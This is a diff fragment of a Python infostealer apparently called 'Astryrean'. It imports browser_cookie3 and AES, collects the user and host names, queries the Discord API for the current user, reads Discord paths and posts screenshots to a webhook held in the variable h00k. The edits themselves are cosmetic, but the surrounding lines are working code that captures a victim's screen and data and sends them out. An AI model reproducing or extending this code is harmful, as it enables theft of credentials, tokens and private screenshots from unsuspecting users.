@@ -49,10 +49,7 @@ import browser_cookie3
 from Crypto.Cipher import AES
 import ctypes
 
-# Coca lola
-
 h00k = ""
-
 
 os_platform = platform.system()
 
@@ -143,7 +140,7 @@ def screenshot():
         files = {"file": (screenshot_filename, f, "image/png")}
         data = {
             "username": "Astryrean", 
-            "content": f"📸 Screenshot",
+            "content": f"Screenshots | github.com/zakocord/Astryrean",
             "avatar_url": "https://i.imgur.com/n5NcLFl.jpeg",  
         }
         response3 = requests.post(h00k, data=data, files=files)
@@ -159,7 +156,7 @@ user_name = os.getlogin()
 host_name = platform.node()
 display_name = os.environ.get('USERPROFILE', 'Unknown User')
 
-api = "https://discord.com/api/v9/users/@me"
+api = "https://discord.com/api/v10/users/@me"
 
 PATHS = {
     'Discord': R + '\\discord',
